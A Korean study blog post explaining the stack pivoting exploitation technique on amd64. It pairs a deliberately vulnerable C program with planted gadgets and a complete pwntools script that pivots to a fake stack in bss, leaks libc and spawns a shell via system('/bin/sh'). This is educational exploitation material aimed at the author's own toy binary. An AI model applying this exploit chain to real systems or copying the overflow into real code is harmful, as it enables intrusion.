---
title: "[PWNABLE] Stack Pivoting"
description: "※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ gadget을 사용하여 쓰기 권한이 있는 영역에 Fake Stack를 구성하는 기법이다.payload가 저장되어 있는 경우, ret까지만 overflow가 발생해야 한다.payload가 저장되어 있지 않은 경우, chain + leave_ret 까지"
date: "2024-06-24"
translation_key: "tistory-0fea48d33bf4"
tags: ["STUDY/PWNABLE_AMD64"]
category: "STUDY/PWNABLE_AMD64"
source_url: "https://whrdud727.tistory.com/entry/PWNABLE-Stack-Pivoting"
private: false
---

**※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. **※**** 

gadget을 사용하여 쓰기 권한이 있는 영역에 Fake Stack를 구성하는 기법이다.

-   payload가 저장되어 있는 경우, ret까지만 overflow가 발생해야 한다.
-   payload가 저장되어 있지 않은 경우, chain + leave\_ret 까지 넣을 있어야 한다.

일반적으로 bof취약점을 한번 밖에 사용하지 못하거나 ret까지만 overflow가능한 경우 사용하는 기법이다.

간단한 예제를 통해 살펴보도록 하겠다.

```
// gcc -no-pie -fno-stack-protector -z execstack -o ex ex.c
#include <stdio.h>
#include <stdlib.h>

int cnt = 0;

void gift(){
	 __asm__ ("pop %r9");
	__asm__ ("pop %r8");
	__asm__ ("pop %rcx");
	__asm__ ("pop %rdx");
	__asm__ ("pop %rsi");
	__asm__ ("pop %rdi");
	__asm__ ("ret");
	__asm__ ("pop %rax");
   	__asm__ ("ret");
  	__asm__ ("pop %rbx");
 	__asm__ ("ret");
 	__asm__ ("mov %rbx, (%rax)");
 	__asm__ ("ret");
 	__asm__ ("mov %rax, (%rbx)");
 	__asm__ ("ret");
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
}
void vuln() {
    char buf[0x40];
    if(cnt != 0){
	    exit(-1);
    }
    cnt = 1;
    puts("Hello! whrd");
    read(0,buf,0x80);
}
int main() {
    initialize();
    vuln();
    return 0;
}
```

임의로 gadget들을 만들어 주었다.

여기서 쓰기 권한이 있는 메모리 영역인 bss를 사용하도록 하겠다.

![](/assets/images/tistory/tistory-0fea48d33bf4/001.png)

첫번째 payload이다.

```
payload = b'a'*0x40
payload += p64(bss+0x300)
payload += p64(p_rdx_rsi_rdi)
payload += p64(0x100)
payload += p64(bss+0x300)
payload += p64(0x0)
payload += p64(read)
payload += p64(leave_ret)
p.send(payload)
```

bss+0x300에다가 fake stack을 구성하고 있다.

leave-ret 과정을 거치고 나면 rbp와 rsp가 fake\_stack을 가리키게 된다.

```
payload = p64(bss+0x400)
payload += p64(p_rdi)
payload += p64(read_got)
payload += p64(puts)
payload += p64(p_rdx_rsi_rdi)
payload += p64(0x100)
payload += p64(bss+0x400)
payload += p64(0x0)
payload += p64(read)
payload += p64(leave_ret)

p.send(payload)
```

leak을 하는 과정이다.

puts()를 사용하여 libc\_base를 구하고 나서 exploit을 위해 bss+0x400 위치에 fake stack을 새로 구성 및 입력을 받고 있다.

```
p.recvuntil(b'\x0a')
leak = u64(p.recvn(6) + b'\x00'*2)
libc_base = leak - libc.sym['read']

print('libc_base : ', hex(libc_base))

system = libc_base + libc.sym['system']
binsh = libc_base + next(libc.search(b"/bin/sh"))

payload = p64(0x0)
payload += p64(p_rdi)
payload += p64(binsh)
payload += p64(system)

p.send(payload)
```

구한 libc를 가지고 system('/bin/sh');를 실행해주면 된다.

![](/assets/images/tistory/tistory-0fea48d33bf4/002.png)

실행해보면 system()까지 정상적으로 실행되는 것을 확인할 수 있다.

```
from pwn import *

target = b'./ex'

context.log_level = 'debug'
p = process(target)
e = ELF(target)
libc = ELF(b'/lib/x86_64-linux-gnu/libc.so.6')

read_got = e.got['read']
read = e.plt['read']
puts = e.plt['puts']
bss = e.bss()
leave_ret = 0x0000000000401252
ret = 0x000000000040101a
p_rdi = 0x00000000004011a5
p_rsi_rdi = 0x00000000004011a4
p_rdx_rsi_rdi = 0x00000000004011a3

####################################

payload = b'a'*0x40
payload += p64(bss+0x300)
payload += p64(p_rdx_rsi_rdi)
payload += p64(0x100)
payload += p64(bss+0x300)
payload += p64(0x0)
payload += p64(read)
payload += p64(leave_ret)
p.send(payload)

####################################

payload = p64(bss+0x400)
payload += p64(p_rdi)
payload += p64(read_got)
payload += p64(puts)
payload += p64(p_rdx_rsi_rdi)
payload += p64(0x100)
payload += p64(bss+0x400)
payload += p64(0x0)
payload += p64(read)
payload += p64(leave_ret)

p.send(payload)

####################################

p.recvuntil(b'\x0a')
leak = u64(p.recvn(6) + b'\x00'*2)
libc_base = leak - libc.sym['read']

print('libc_base : ', hex(libc_base))

system = libc_base + libc.sym['system']
binsh = libc_base + next(libc.search(b"/bin/sh"))

####################################

payload = p64(0x0)
payload += p64(p_rdi)
payload += p64(binsh)
payload += p64(system)

p.send(payload)

####################################

p.interactive()
```
